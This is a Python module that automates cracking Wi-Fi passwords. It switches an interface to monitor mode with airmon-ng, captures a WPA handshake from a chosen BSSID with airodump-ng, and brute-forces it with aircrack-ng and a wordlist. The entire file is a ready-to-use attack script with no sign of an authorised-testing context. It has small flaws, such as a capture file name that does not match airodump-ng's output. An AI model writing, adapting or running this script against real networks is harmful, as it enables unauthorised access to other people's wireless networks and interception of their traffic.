import subprocess
import os
import time

def run_wifi_crack(args):
    iface = args.interface
    bssid = args.bssid
    channel = args.channel
    wordlist = args.wordlist
    capture_file = "handshake.cap"

    try:
        print(f"[+] Setting interface {iface} to monitor mode...")
        subprocess.run(["airmon-ng", "start", iface], check=True)

        print(f"[+] Starting airodump-ng to capture handshake...")
        dump_proc = subprocess.Popen([
            "airodump-ng", "--bssid", bssid, "--channel", channel,
            "-w", "handshake", iface + "mon"
        ])

        print("[*] Wait for handshake... or press Ctrl+C to stop when ready.")
        time.sleep(20)  # Wait a bit, user can Ctrl+C when handshake is seen

    except KeyboardInterrupt:
        print("\n[!] Capture stopped by user.")
        dump_proc.terminate()
        time.sleep(2)

    print(f"[+] Attempting to crack handshake with wordlist: {wordlist}")
    subprocess.run(["aircrack-ng", "-w", wordlist, capture_file])

    print("[+] Wi-Fi cracking module complete.")
